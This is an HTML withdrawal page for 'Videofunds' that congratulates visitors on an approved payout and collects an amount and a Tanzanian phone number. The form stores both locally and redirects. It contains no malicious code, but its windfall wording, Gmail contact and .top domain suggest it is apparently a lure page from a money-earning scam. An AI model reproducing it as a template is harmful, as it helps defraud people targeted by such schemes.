<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Videofunds Withdrawal</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }

    .header {
      background-color: #7b0f2f;
      color: white;
      padding: 10px;
      text-align: left;
      font-size: 20px;
    }

    .content {
      margin: 30px auto;
      padding: 20px;
      background: white;
      max-width: 400px;
      border-radius: 10px;
      text-align: center;
    }

    h2 {
      color: green;
    }

    label {
      font-weight: bold;
      display: block;
      margin: 15px 0 5px;
      text-align: left;
    }

    input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      margin-top: 20px;
      background-color: green;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: darkgreen;
    }

    .email-btn {
      position: fixed;
      bottom: 20px;
      left: 20px;
      background-color: darkred;
      color: white;
      padding: 10px 20px;
      border-radius: 6px;
      border: none;
      font-size: 14px;
      cursor: pointer;
    }
        footer {
      background-color: #2c2c2c;
      color: white;
      text-align: center;
      padding: 40px;
      font-size: 20px;
    }
  </style>
</head>
<body background="images/background.jpg"> 

  <div class="header">Videofunds</div>

  <div class="content">
    <h2>Congratulations! Your Account is Now Approved for Withdrawal</h2>
    <p style="color:blue; font-weight: bold;">Please Enter Amount you want to Withdrawal</p>

    <form id="withdrawForm">
      <label for="amount">Amount (Max 7 digits):</label>
      <input type="text" id="amount" placeholder="Enter amount" required maxlength="11">

      <label for="phone">Enter Phone Number:</label>
      <input type="tel" id="phone" placeholder="+255XXXXXXXXX" required>

      <button type="submit">Confirm</button>
    </form>
  </div>

  <button class="email-btn" onclick="location.href='mailto:officialvideofunds@gmail.com?subject=Support Request'">Email Us</button>

  <script>
    // Format amount
    document.getElementById("amount").addEventListener("input", function () {
      let val = this.value.replace(/,/g, '').replace(/\D/g, '');
      if (val.length > 7) val = val.slice(0, 7);
      this.value = Number(val).toLocaleString('en-US');
    });

    // Handle form submit
    document.getElementById("withdrawForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const phone = document.getElementById("phone").value.trim();
      const amount = document.getElementById("amount").value.trim();

      if (!/^\+255\d{9}$/.test(phone)) {
        alert("Invalid phone number. Format: +255XXXXXXXXX");
        return;
      }

      localStorage.setItem("userPhone", phone);
      localStorage.setItem("userAmount", amount);
      window.location.href = "confirmation.html";
    });
  </script>

</body>
</html>

<br>
<footer class="py-5 bg-dark">
        <div class="container">
            <p class="m-0 text-center text-white">Copyright &copy; videofunds.top 2007-2025</p>
        </div>
    </footer>
